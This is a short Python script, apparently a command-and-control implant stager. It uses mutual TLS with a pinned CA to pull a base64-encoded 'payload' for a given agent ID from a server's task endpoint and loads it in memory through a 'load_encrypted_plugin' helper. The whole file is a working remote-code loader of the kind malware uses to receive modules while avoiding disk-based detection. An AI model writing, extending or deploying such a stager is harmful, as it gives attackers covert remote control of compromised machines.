
import requests
import base64
from memory_loader import load_encrypted_plugin

def fetch_plugin_mtls(agent_id: str, server_url: str, cert_path: str, key_path: str, ca_cert: str):
    try:
        session = requests.Session()
        session.cert = (cert_path, key_path)
        session.verify = ca_cert  # This enforces pinned CA

        response = session.get(f"{server_url}/task/{agent_id}", timeout=10)
        if response.status_code == 200:
            payload = response.json().get("payload")
            if payload:
                plugin_blob = base64.b64decode(payload.encode())
                load_encrypted_plugin(plugin_blob, agent_id)
                return True
        return False
    except Exception as e:
        print(f"[!] mTLS plugin fetch failed: {e}")
        return False

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 6:
        print("Usage: python mtls_plugin_fetcher.py <agent_id> <server_url> <cert.pem> <key.pem> <ca.pem>")
        sys.exit(1)

    agent_id, server_url, cert_path, key_path, ca_cert = sys.argv[1:]
    fetch_plugin_mtls(agent_id, server_url, cert_path, key_path, ca_cert)
